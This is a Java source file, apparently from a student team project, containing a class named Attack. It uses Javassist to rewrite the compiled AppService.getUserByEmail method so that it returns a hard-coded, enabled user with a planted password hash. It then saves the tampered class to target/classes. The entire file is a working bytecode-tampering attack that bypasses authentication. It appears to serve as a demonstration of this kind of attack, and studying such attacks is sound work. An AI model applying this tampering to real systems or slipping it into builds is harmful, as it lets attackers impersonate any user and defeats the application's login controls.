package com.se518.teamproject.attack;

import javassist.*;

public class Attack {
    public static void main(String[] args) {
        try {
            // Load the AppService class
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.get("com.se518.teamproject.AppService");

            // Modify the `getUserByEmail` method
            CtMethod method = ctClass.getDeclaredMethod("getUserByEmail");
            method.setBody("{ return new com.se518.teamproject.WebUser(Integer.valueOf(3), (String) $1, \"$2a$10$HACKEDPASSWORD\", (String) null, Boolean.TRUE, \"Hacked\", \"User\"); }");

            // Save the modified class to disk to the target/classes directory
            ctClass.writeFile("target/classes");
            System.out.println("Attack executed successfully. AppService.getUserByEmail modified and saved to disk.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
